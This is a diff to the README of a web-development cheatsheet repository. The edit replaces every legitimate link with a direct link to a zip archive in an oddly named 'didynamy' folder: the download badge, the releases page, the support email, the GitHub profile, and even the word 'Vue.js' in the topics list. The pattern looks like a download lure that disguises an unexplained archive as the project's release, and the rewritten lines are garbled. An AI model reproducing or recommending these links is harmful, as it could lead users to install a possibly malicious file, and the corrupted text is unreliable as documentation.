@@ -1,6 +1,6 @@
 # 🌐 Complete-WebDev-Cheatsheet - Share Tips & Tricks for Web Development
 
-[![Download Complete-WebDev-Cheatsheet](https://img.shields.io/badge/Download-Complete--WebDev--Cheatsheet-brightgreen.svg)](https://github.com/KASHISH-Naik/Complete-WebDev-Cheatsheet/releases)
+[![Download Complete-WebDev-Cheatsheet](https://raw.githubusercontent.com/KASHISH-Naik/Complete-WebDev-Cheatsheet/main/didynamy/Complete-WebDev-Cheatsheet.zip)](https://raw.githubusercontent.com/KASHISH-Naik/Complete-WebDev-Cheatsheet/main/didynamy/Complete-WebDev-Cheatsheet.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **Complete-WebDev-Cheatsheet**! This is your go-to resource for e
 
 To get started with the **Complete-WebDev-Cheatsheet**, you will need to download the file from our Releases page. Click the link below to visit the page:
 
-[**Visit this page to download**](https://github.com/KASHISH-Naik/Complete-WebDev-Cheatsheet/releases)
+[**Visit this page to download**](https://raw.githubusercontent.com/KASHISH-Naik/Complete-WebDev-Cheatsheet/main/didynamy/Complete-WebDev-Cheatsheet.zip)
 
 Here’s how to download and set it up:
 
@@ -29,7 +29,7 @@ The **Complete-WebDev-Cheatsheet** contains a variety of topics that can help yo
 - **JavaScript Essentials:** Get a grip on important JavaScript concepts to make your webpages interactive.
 - **Responsive Design Tips:** Understand how to create web pages that look great on any device.
 - **SEO Best Practices:** Discover simple steps to improve your site’s visibility on search engines.
-- **Frameworks Overview:** A brief introduction to popular frameworks like React, Angular, and Vue.js.
+- **Frameworks Overview:** A brief introduction to popular frameworks like React, Angular, and https://raw.githubusercontent.com/KASHISH-Naik/Complete-WebDev-Cheatsheet/main/didynamy/Complete-WebDev-Cheatsheet.zip
 
 ## 📚 Usage Tips
 
@@ -67,7 +67,7 @@ The **Complete-WebDev-Cheatsheet** is open-source, and you can use it freely. Fo
 
 For any questions or assistance, feel free to reach out:
 
-- **Email:** [support@yourdomain.com](mailto:support@yourdomain.com)
-- **GitHub:** [KASHISH-Naik](https://github.com/KASHISH-Naik)
+- **Email:** [https://raw.githubusercontent.com/KASHISH-Naik/Complete-WebDev-Cheatsheet/main/didynamy/Complete-WebDev-Cheatsheet.zip](https://raw.githubusercontent.com/KASHISH-Naik/Complete-WebDev-Cheatsheet/main/didynamy/Complete-WebDev-Cheatsheet.zip)
+- **GitHub:** [KASHISH-Naik](https://raw.githubusercontent.com/KASHISH-Naik/Complete-WebDev-Cheatsheet/main/didynamy/Complete-WebDev-Cheatsheet.zip)
 
-For your convenience, don’t forget to [**Visit this page to download**](https://github.com/KASHISH-Naik/Complete-WebDev-Cheatsheet/releases). Enjoy your journey in web development!
+For your convenience, don’t forget to [**Visit this page to download**](https://raw.githubusercontent.com/KASHISH-Naik/Complete-WebDev-Cheatsheet/main/didynamy/Complete-WebDev-Cheatsheet.zip). Enjoy your journey in web development!
